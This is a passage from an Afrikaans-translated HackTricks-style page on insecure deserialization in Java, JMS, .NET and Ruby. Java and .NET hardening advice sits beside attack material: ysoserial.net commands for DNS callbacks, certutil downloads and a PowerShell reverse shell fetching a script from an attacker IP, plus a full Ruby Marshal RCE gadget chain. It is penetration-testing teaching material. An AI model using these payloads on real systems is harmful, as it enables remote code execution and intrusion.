'n Klas wat `Serializable` implementeer, kan enige objek binne die klas as `verganklik` implementeer wat nie serialiseerbaar moet wees nie. Byvoorbeeld:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Vermyt Serialisering van 'n klas wat `Serializable` moet implementeer

In situasies waar sekere **voorwerpe die `Serializable`-koppelvlak moet implementeer** as gevolg van klas-hi√´rargie, is daar 'n risiko van onbedoelde deserialisering. Om dit te voorkom, verseker dat hierdie voorwerpe nie deserialiseerbaar is deur 'n `final` `readObject()`-metode te definieer wat konsekwent 'n uitsondering gooi, soos hieronder getoon:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Verbetering van Deserialisering Sekuriteit in Java**

**Aanpassing van `java.io.ObjectInputStream`** is 'n praktiese benadering vir die beveiliging van deserialisering prosesse. Hierdie metode is geskik wanneer:

- Die deserialisering kode onder jou beheer is.
- Die klasse wat verwag word vir deserialisering bekend is.

Oorskryf die **`resolveClass()`** metode om deserialisering te beperk tot slegs toegelate klasse. Dit voorkom deserialisering van enige klasse behalwe di√© wat uitdruklik toegelaat is, soos in die volgende voorbeeld wat deserialisering beperk tot slegs die `Bicycle` klasse:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Die gebruik van 'n Java Agent vir Sekuriteitsverbetering** bied 'n alternatiewe oplossing wanneer kode wysiging nie moontlik is nie. Hierdie metode is hoofsaaklik van toepassing vir die **swartlys maak van skadelike klasse**, deur gebruik te maak van 'n JVM-parameter:
```
-javaagent:name-of-agent.jar
```
Dit bied 'n manier om deserialisering dinamies te beveilig, ideaal vir omgewings waar onmiddellike koderingsveranderinge onprakties is.

Kyk na 'n voorbeeld in [rO0 deur Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)


**Implementering van Serialiseringfilters**: Java 9 het serialiseringfilters ingevoer via die **`ObjectInputFilter`**-koppelvlak, wat 'n kragtige meganisme bied om kriteria te spesifiseer wat geserialiseerde objekte moet nakom voordat dit gedeserialiseer word. Hierdie filters kan globaal of per stroom toegepas word en bied 'n fyn beheer oor die deserialiseringsproses.

Om serialiseringfilters te gebruik, kan jy 'n globale filter instel wat van toepassing is op alle deserialiseringshandelinge of dit dinamies konfigureer vir spesifieke strome. Byvoorbeeld:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Benutting Eksterne Biblioteke vir Verbeterde Sekuriteit**: Biblioteke soos **NotSoSerial**, **jdeserialize**, en **Kryo** bied gevorderde funksies vir die beheer en monitering van Java deserialisasie. Hierdie biblioteke kan addisionele sekuriteitslae bied, soos die witlys of swartlys van klasse, die analise van geserialiseerde voorwerpe voor deserialisasie, en die implementering van aangepaste serialisasie strategie√´.

- **NotSoSerial** onderskep deserialisasieprosesse om die uitvoering van onbetroubare kode te voorkom.
- **jdeserialize** maak dit moontlik om geserialiseerde Java-voorwerpe te analiseer sonder om hulle te deserialiseer, wat help om potensieel skadelike inhoud te identifiseer.
- **Kryo** is 'n alternatiewe serialisasie-raamwerk wat klem l√™ op spoed en doeltreffendheid, en bied konfigureerbare serialisasie strategie√´ wat die sekuriteit kan verbeter.

### Verwysings

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserialisasie en ysoserial praat: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Praat oor gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) en dia's: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec-artikel: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java en .Net JSON deserialisasie **artikel:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** praat: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) en dia's: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* Deserialisasie CVE's: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injeksie & log4Shell

Vind uit wat **JNDI Injeksie is, hoe om dit te misbruik via RMI, CORBA & LDAP en hoe om log4shell te benut** (en 'n voorbeeld van hierdie kwesbaarheid) op die volgende bladsy:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Berigdiens

> Die **Java Berigdiens** (**JMS**) API is 'n Java-gebaseerde beriggeori√´nteerde middelware API vir die stuur van boodskappe tussen twee of meer kli√´nte. Dit is 'n implementering om die produsent-verbruiker-probleem te hanteer. JMS is 'n deel van die Java Platform, Enterprise Edition (Java EE), en is gedefinieer deur 'n spesifikasie wat ontwikkel is deur Sun Microsystems, maar wat sedertien deur die Java Community Process gelei word. Dit is 'n berigstandaard wat dit moontlik maak vir toepassingskomponente wat op Java EE gebaseer is om boodskappe te skep, stuur, ontvang en lees. Dit maak die kommunikasie tussen verskillende komponente van 'n verspreide toepassing losgekoppeld, betroubaar en asinkronies. (Van [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produkte

Daar is verskeie produkte wat hierdie middelware gebruik om boodskappe te stuur:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (291).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (292).png>)

### Uitbuiting

Dus, daar is basies 'n **klomp dienste wat JMS op 'n gevaarlike manier gebruik**. As jy dus **genoeg voorregte** het om boodskappe na hierdie dienste te stuur (gewoonlik sal jy geldige geloofsbriewe nodig h√™), kan jy in staat wees om **skadelike voorwerpe te stuur wat geserialiseer word en deur die verbruiker/geabonneerde gedeserialiseer word**.\
Dit beteken dat in hierdie uitbuiting al die **kli√´nte wat daardie boodskap gaan gebruik, ge√Ønfekteer sal word**.

Onthou dat selfs as 'n diens kwesbaar is (omdat dit gebruikersinvoer onveilig deserialiseer), moet jy steeds geldige gadgets vind om die kwesbaarheid uit te buit.

Die instrument [JMET](https://github.com/matthiaskaiser/jmet) is geskep om **verbind en val hierdie dienste aan deur verskeie skadelike voorwerpe te stuur wat geserialiseer word met bekende gadgets**. Hierdie uitbuitings sal werk as die diens steeds kwesbaar is en as enige van die gebruikte gadgets binne die kwesbare toepassing is.

### Verwysings

* JMET praat: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Dia's: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

In die konteks van .Net werk deserialisasie-uitbuitings op 'n manier soortgelyk aan di√© wat in Java gevind word, waar gadgets uitgebuit word om spesifieke kode uit te voer tydens die deserialisasie van 'n voorwerp.
### Vingerafdruk

#### WhiteBox

Die bronkode moet ondersoek word vir voorkomste van:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Die fokus moet wees op serializeerders wat die tipe toelaat om bepaal te word deur 'n veranderlike onder gebruikersbeheer.

#### BlackBox

Die soektog moet gemik wees op die Base64-gekodeerde string **AAEAAAD/////** of enige soortgelyke patroon wat dalk gedeserializeer word aan die kant van die bediener, wat beheer oor die tipe wat gedeserializeer moet word, verleen. Dit kan insluit, maar is nie beperk tot nie, **JSON** of **XML** strukture met `TypeObject` of `$type`.

### ysoserial.net

In hierdie geval kan jy die instrument [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) gebruik om die deserialisering-uitbuitings te **skep**. Nadat die git-opberging afgehaal is, moet jy die instrument **kompileer** met behulp van Visual Studio, byvoorbeeld.

As jy wil leer oor **hoe ysoserial.net sy uitbuitings skep**, kan jy [**hierdie bladsy raadpleeg waar die ObjectDataProvider-gadget + ExpandedWrapper + Json.Net-formatter verduidelik word**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Die hoofopsies van **ysoserial.net** is: **`--gadget`**, **`--formatter`**, **`--output`** en **`--plugin`.**

* **`--gadget`** word gebruik om die gadget aan te dui wat misbruik moet word (d.w.s. die klas/funksie wat tydens deserialisering misbruik sal word om opdragte uit te voer).
* **`--formatter`** word gebruik om die metode aan te dui om die uitbuiting te serializeer (jy moet weet watter biblioteek die agterkant gebruik om die nutslading te deserialiseer en dieselfde een gebruik om dit te serializeer)
* **`--output`** word gebruik om aan te dui of jy die uitbuiting in **rof** of **Base64**-gekodeerde formaat wil h√™. _Let daarop dat **ysoserial.net** die nutslading sal **kodeer** met behulp van **UTF-16LE** (die standaardkodering wat op Windows gebruik word), so as jy die rof formaat kry en dit net vanaf 'n Linux-konsole kodeer, kan jy enige **koderingsverenigbaarheidsprobleme** h√™ wat die uitbuiting verhoed om behoorlik te werk (in HTB JSON-boks het die nutslading in beide UTF-16LE en ASCII gewerk, maar dit beteken nie dat dit altyd sal werk nie)._
* **`--plugin`** ysoserial.net ondersteun plugins om **uitbuitings vir spesifieke raamwerke** soos ViewState te skep

#### Meer ysoserial.net parameters

* `--minify` sal 'n **kleiner nutslading** voorsien (indien moontlik)
* `--raf -f Json.Net -c "iets"` Dit sal al die gadgets aandui wat met 'n spesifieke formatter (`Json.Net` in hierdie geval) gebruik kan word
* `--sf xml` jy kan 'n gadget aandui (`-g`) en ysoserial.net sal soek na formatters wat "xml" bevat (hoofletterongevoelig)

**ysoserial-voorbeelde** om uitbuitings te skep:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** het ook 'n **baie interessante parameter** wat help om beter te verstaan hoe elke uitbuit werk: `--test`\
As jy hierdie parameter aandui, sal **ysoserial.net** die uitbuit **plaaslik probeer**, sodat jy kan toets of jou payload korrek sal werk.\
Hierdie parameter is nuttig omdat as jy die kode deurloop, sal jy stukke kode soos die volgende een vind (vanaf [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Dit beteken dat om die uitbuiting te toets, sal die kode [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) aanroep.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In die **vorige kode is vatbaar vir die skep van 'n uitbuiting**. As jy iets soortgelyks in 'n .Net-toepassing vind, beteken dit waarskynlik dat die toepassing ook vatbaar is.\
Daarom stel die **`--toets`** parameter ons in staat om te verstaan **watter stukke kode vatbaar is** vir die deserialisasie-uitbuiting wat **ysoserial.net** kan skep.

### ViewState

Neem 'n kyk na [hierdie POST oor **hoe om te probeer om die \_\_ViewState-parameter van .Net uit te buit**](exploiting-\_\_viewstate-parameter.md) om **arbitr√™re kode uit te voer**. As jy **reeds die geheime** ken wat deur die slagoffer masjien gebruik word, [**lees hierdie pos om te weet hoe om kode uit te voer**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Voorkoming

Om die risiko's wat verband hou met deserialisasie in .Net te verminder:

- **Vermy dat datastrome hul objek tipes definieer.** Maak gebruik van `DataContractSerializer` of `XmlSerializer` waar moontlik.

- **Stel `TypeNameHandling` vir `JSON.Net` in op `None`:**
%%%TypeNameHandling = TypeNameHandling.None%%%

- **Vermy om `JavaScriptSerializer` met 'n `JavaScriptTypeResolver` te gebruik.**

- **Beperk die tipes wat gedeserialiseer kan word**, en verstaan die inherente risiko's met .Net tipes, soos `System.IO.FileInfo`, wat die eienskappe van bedienerl√™ers kan wysig en moontlik lei tot ontkenning van diensaanvalle.

- **Wees versigtig met tipes wat risikovolle eienskappe het**, soos `System.ComponentModel.DataAnnotations.ValidationException` met sy `Value` eienskap, wat uitgebuit kan word.

- **Beheer die instansiasie van tipes veilig** om te voorkom dat aanvallers die deserialisasieproses be√Ønvloed, selfs `DataContractSerializer` of `XmlSerializer` kwesbaar maak.

- **Implementeer witlysbeheer** deur 'n aangepaste `SerializationBinder` vir `BinaryFormatter` en `JSON.Net` te gebruik.

- **Bly op hoogte van bekende onveilige deserialisasie gadgets** binne .Net en verseker dat deserialiseerders nie sulke tipes instansieer nie.

- **Isoleer potensieel risikovolle kode** van kode met internettoegang om bekende gadgets, soos `System.Windows.Data.ObjectDataProvider` in WPF-toepassings, te beskerm teen onbetroubare data-bronne.

### **Verwysings**

* Java en .Net JSON deserialisasie **artikel:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** praatjie: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) en dia's: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

In Ruby word serialisasie fasiliteer deur twee metodes binne die **marshal**-biblioteek. Die eerste metode, bekend as **dump**, word gebruik om 'n objek in 'n byte-stroom te omskep. Hierdie proses word serialisasie genoem. Omgekeerd word die tweede metode, **load**, gebruik om 'n byte-stroom terug te skakel na 'n objek, 'n proses wat deserialisasie genoem word.

Vir die beveiliging van geserialiseerde objekte, maak **Ruby gebruik van HMAC (Hash-Based Message Authentication Code)** om die integriteit en egtheid van die data te verseker. Die sleutel wat vir hierdie doel gebruik word, word gestoor op een van verskeie moontlike plekke:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generiese deserialisasie na RCE gadget-ketting (meer inligting in [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/))**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Ander RCE-ketting om Ruby On Rails te misbruik: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
